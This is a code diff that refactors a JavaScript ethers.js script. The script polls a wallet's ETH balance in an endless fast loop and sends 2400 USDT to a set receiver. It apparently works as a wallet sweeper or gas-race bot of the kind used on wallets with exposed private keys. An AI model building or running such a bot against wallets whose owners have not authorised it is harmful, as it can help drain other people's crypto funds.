@@ -21,7 +21,17 @@ const blocklist = new Set([
 
 // Initialize provider and wallet
 const provider = new ethers.providers.JsonRpcProvider(alchemyApi);
-const wallet = new ethers.Wallet(senderPrivateKey, provider);
+
+async function initializeWallet() {
+  try {
+    // Ensure the provider is working correctly
+    await provider.getBlockNumber();
+  } catch (error) {
+    console.error("Failed to connect to the provider. Check your Alchemy API URL.");
+    process.exit(1); // Exit the script if the provider is not working
+  }
+  return new ethers.Wallet(senderPrivateKey, provider);
+}
 
 // USDT Contract ABI (minimal)
 const usdtAbi = [
@@ -29,11 +39,8 @@ const usdtAbi = [
   "function balanceOf(address owner) view returns (uint256)"
 ];
 
-// Create USDT contract instance
-const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, wallet);
-
 // Function to check ETH balance and send USDT
-async function checkAndSend() {
+async function checkAndSend(wallet) {
   try {
     const ethBalance = await provider.getBalance(senderAddress);
     const ethInEther = ethers.utils.formatEther(ethBalance);
@@ -43,11 +50,14 @@ async function checkAndSend() {
       // Ensure receiver is not blocklisted
       if (blocklist.has(receiverAddress.toLowerCase())) return;
 
+      // USDT Contract instance
+      const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, wallet);
+
       // Send 2400 USDT (USDT has 6 decimals, so 2400 USDT = 2400000000 units)
       const usdtAmount = ethers.utils.parseUnits("2400", 6);
       const tx = await usdtContract.transfer(receiverAddress, usdtAmount);
 
-      // Wait for confirmation (optional, but faster)
+      // Wait for confirmation (optional)
       await tx.wait();
     }
   } catch (error) {
@@ -56,10 +66,13 @@ async function checkAndSend() {
 }
 
 // Monitor balance continuously (as quickly as possible)
-async function monitor() {
+async function monitor(wallet) {
   while (true) {
-    await checkAndSend();
+    await checkAndSend(wallet);
   }
 }
 
-monitor();
+(async () => {
+  const wallet = await initializeWallet();
+  monitor(wallet);
+})();
